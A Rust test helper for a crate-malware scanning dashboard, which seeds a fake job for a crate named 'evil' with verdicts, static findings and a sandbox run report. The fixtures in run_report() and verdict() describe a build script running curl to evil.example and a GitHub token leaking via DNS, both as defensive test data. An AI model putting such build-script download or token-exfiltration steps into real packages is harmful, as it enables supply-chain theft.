//! A dashboard on a private schema, and the jobs the tests seed into it.

use std::future::IntoFuture;
use std::sync::Arc;
use std::time::Duration;

use crateward_api::{AppState, router};
use crateward_core::app::Stop;
use crateward_core::job::{JobEvent, JobId, Stage, Triage};
use crateward_core::store::{CrateFile, DisclosureKind, NewJob, Review, Store};
use crateward_core::testing::{TestDb, policies};
use crateward_core::verdict::{
    Coverage, Evidence, EvidenceSource, RiskLevel, StaticOnlyReason, Verdict,
};
use serde_json::{Value, json};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::{TcpListener, TcpStream};

pub const CKSUM: &str = "abababababababababababababababababababababababababababababababab";

/// A migrated private schema with the dashboard in front of it.
pub struct Dashboard {
    pub db: TestDb,
    pub store: Store,
    pub port: u16,
}

impl Dashboard {
    pub async fn start() -> Option<Self> {
        let db = TestDb::new("api").await?;
        let store = db.migrated().await;
        let state = AppState {
            reader: db.store().await,
            writer: db.store().await,
            stop: Stop::install().unwrap(),
        };

        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let port = listener.local_addr().unwrap().port();
        tokio::spawn(axum::serve(listener, router(Arc::new(state), port)).into_future());

        Some(Self { db, store, port })
    }

    /// The status and body of a `GET`.
    pub async fn get(&self, path: &str) -> (u16, String) {
        let (status, _, body) = self.fetch(path).await;

        (status, body)
    }

    /// The status, lowercased head and body of a `GET`.
    pub async fn fetch(&self, path: &str) -> (u16, String, String) {
        self.request("GET", path, "").await
    }

    /// The status of a form `POST` from the dashboard itself.
    pub async fn post(&self, path: &str, form: &str) -> u16 {
        self.request("POST", path, form).await.0
    }

    pub async fn request(&self, method: &str, path: &str, form: &str) -> (u16, String, String) {
        let mut stream = TcpStream::connect(("127.0.0.1", self.port)).await.unwrap();
        let host = format!("127.0.0.1:{}", self.port);
        let request = format!(
            "{method} {path} HTTP/1.1\r\nHost: {host}\r\nOrigin: http://{host}\r\n\
             Content-Type: application/x-www-form-urlencoded\r\nContent-Length: {}\r\n\
             Connection: close\r\n\r\n{form}",
            form.len()
        );

        stream.write_all(request.as_bytes()).await.unwrap();
        let mut raw = Vec::new();
        stream.read_to_end(&mut raw).await.unwrap();
        let text = String::from_utf8(raw).unwrap();
        let (head, body) = text.split_once("\r\n\r\n").unwrap();
        let status = head.split(' ').nth(1).unwrap().parse().unwrap();

        (status, head.to_ascii_lowercase(), body.to_owned())
    }

    /// The page of a job.
    pub async fn page(&self, job: JobId) -> String {
        let (status, html) = self.get(&format!("/jobs/{}", job.0)).await;

        assert_eq!(status, 200);

        html
    }

    pub async fn job(&self) -> JobId {
        let new = NewJob {
            name: "evil".parse().unwrap(),
            version: "0.1.0".parse().unwrap(),
            cksum: CKSUM.parse().unwrap(),
            published_at: None,
            priority: 0,
            index_entry: json!({}),
        };

        self.store.enqueue(&new).await.unwrap().unwrap()
    }

    /// One worker takes the job and reports an event.
    pub async fn step(&mut self, job: JobId, stage: Stage, worker: &str, event: JobEvent) {
        let lease = Duration::from_secs(30);
        let claimed = self.store.claim(stage, worker, lease).await.unwrap();

        assert_eq!(claimed.unwrap().id, job);

        let policies = policies();
        let done = self.store.complete(job, worker, event, &policies, false);
        done.await.unwrap();
    }

    /// An event row as an older or damaged database could hold it.
    pub async fn raw_event(&self, job: JobId, at: &str, event: &str) {
        let insert = format!(
            "INSERT INTO {}.job_events (job_id, at, from_state, to_state, event, effect, worker)
             VALUES ($1, {at}, 'Scored', 'Finalized', $2::text::jsonb, '{{}}'::jsonb, 'w-raw')",
            self.db.schema()
        );

        self.db
            .admin()
            .execute(&insert, &[&job.0, &event])
            .await
            .unwrap();
    }

    pub async fn drop(self) {
        self.db.drop().await;
    }
}

pub fn evidence(
    signal: &str,
    points: u32,
    source: EvidenceSource,
    summary: &str,
    package: Option<&str>,
    location: Option<&str>,
) -> Evidence {
    Evidence {
        signal: signal.to_owned(),
        points,
        source,
        summary: summary.to_owned(),
        package: package.map(str::to_owned),
        location: location.map(str::to_owned),
    }
}

/// One piece of evidence from each source, with guest text that needs
/// escaping.
pub fn verdict() -> Verdict {
    use EvidenceSource::{Diff, Disk, Network, Run, Static, Trace};

    Verdict {
        score: 85,
        level: RiskLevel::from_score(85),
        coverage: Coverage::DynamicLinux,
        evidence: vec![
            evidence(
                "honeytoken_left_vm",
                60,
                Network,
                "a token went out",
                Some("evil"),
                Some("203.0.113.9:443"),
            ),
            evidence(
                "exec_curl",
                10,
                Trace,
                "ran <curl> & \"more\"",
                None,
                Some("build.rs:12"),
            ),
            evidence("obfuscation", 5, Static, "packed string", Some("dep"), None),
            evidence("new_network", 4, Diff, "new since 0.0.9", None, None),
            evidence("disk_write", 3, Disk, "wrote outside target", None, None),
            evidence("timeout", 3, Run, "the run ended late", None, None),
        ],
        profile: vec!["exec:curl".to_owned(), "net:203.0.113.9:443".to_owned()],
        new_behavior: vec!["exec:curl".to_owned()],
        analyzer_version: 1,
    }
}

/// Findings of every shape the page has to show, then filler up to a number
/// above the page's limit of 300.
pub fn static_report() -> Value {
    let mut findings = vec![
        json!({"severity": "high", "kind": "build_script", "rule": "net_call", "context": "fn main", "file": "build.rs", "line": 12, "evidence": "Command::new(\"curl\")"}),
        json!({"severity": "low", "kind": "unsafe_block", "context": "lib", "file": "src/lib.rs", "evidence": "unsafe { <x> }"}),
        json!({"severity": 3, "kind": "odd", "rule": 7, "context": null, "file": "src/odd.rs", "line": "9", "evidence": true}),
        json!({"kind": "sparse"}),
    ];

    for i in 4..305 {
        findings.push(json!({"severity": "info", "kind": "filler", "file": "src/f.rs", "evidence": format!("e{i}")}));
    }

    for line in 1..=60 {
        findings.push(json!({"severity": "medium", "kind": "process_spawn", "context": "build_script", "file": "build.rs", "line": line, "evidence": "Command::new"}));
    }

    json!({"findings": findings})
}

pub fn crate_file() -> CrateFile {
    CrateFile {
        sha256: CKSUM.parse().unwrap(),
        sha512: None,
        name: "evil".to_owned(),
        version: "0.1.0".to_owned(),
        blake3: None,
        compressed_bytes: 5,
        unpacked_bytes: 9,
        stored_bytes: None,
        report: json!({}),
    }
}

/// A check run whose build script downloaded something, with guest text
/// that needs escaping.
pub fn run_report() -> Value {
    json!({
        "outcome": "succeeded", "end": "finished", "exit": {"Code": 0},
        "run_ms": 4250, "restore_ms": 90, "payload_files": 3, "payload_bytes": 4096,
        "stdout_tail": "", "stderr_tail": "warning: <unused>", "truncated": false,
        "missing_packages": [],
        "network": {"dns": ["evil.example"], "connections": [], "udp_datagrams": 0, "refused": 0, "truncated": false},
        "leaked": [{"kind": "github_token", "via": "dns:evil.example"}],
        "trace": {"complete": true, "opens": 12, "processes_omitted": 0, "omitted": 0,
                  "processes": [
                      {"pid": 1, "exe": "/usr/bin/cargo", "argv": ["cargo", "check"], "role": "cargo", "started_ms": 0},
                      {"pid": 2, "ppid": 1, "exe": "/usr/bin/rustc", "argv": ["rustc"], "role": "rustc", "started_ms": 5},
                      {"pid": 3, "ppid": 1, "exe": "/w/build-script-build", "argv": ["b"], "role": "build_script", "started_ms": 9},
                      {"pid": 4, "ppid": 3, "exe": "/usr/bin/<curl>", "argv": ["curl", "https://evil.example/x"], "role": "other", "started_ms": 12, "exit": 0}
                  ],
                  "sensitive_opens": [], "writes_outside_work": [], "sockets": [], "tamper": []}
    })
}

/// A job that went through three stages and has everything recorded that
/// the page can show.
pub async fn seed_full_job(db: &mut Dashboard) -> JobId {
    let job = db.job().await;
    let fetched = JobEvent::Fetched;
    db.step(job, Stage::Fetch, "w-fetch", fetched).await;
    let triage = Triage::StaticOnly(StaticOnlyReason::NoBuildTimeCode);
    let analyzed = JobEvent::StaticAnalysisCompleted { triage };
    db.step(job, Stage::StaticAnalysis, "w-static", analyzed)
        .await;
    let scored = JobEvent::Scored { escalate: false };
    db.step(job, Stage::Analysis, "w-analysis", scored).await;
    let store = &db.store;
    store.record_verdict(job, &verdict()).await.unwrap();

    assert!(
        store
            .set_review(job, Review::Confirmed, None)
            .await
            .unwrap()
    );

    store.record_crate_file(&crate_file()).await.unwrap();
    let cksum = CKSUM.parse().unwrap();
    let report = static_report();
    store
        .record_static_report(&cksum, 7, true, Some("high"), &report)
        .await
        .unwrap();
    store
        .record_run(job, "full", "completed", &run_report())
        .await
        .unwrap();
    store
        .record_run(job, "check", "completed", &json!({"network": "x"}))
        .await
        .unwrap();
    let kind = DisclosureKind::Malicious;
    let note = Some("n<1>");
    let reported = store.record_report(job, kind, "crates.io", Some("RUSTSEC-1"), note);
    reported.await.unwrap().unwrap();
    store.mark_resolved(job, None).await.unwrap().unwrap();
    store
        .publish_finding(job, "evil-0-1-0")
        .await
        .unwrap()
        .unwrap();

    job
}
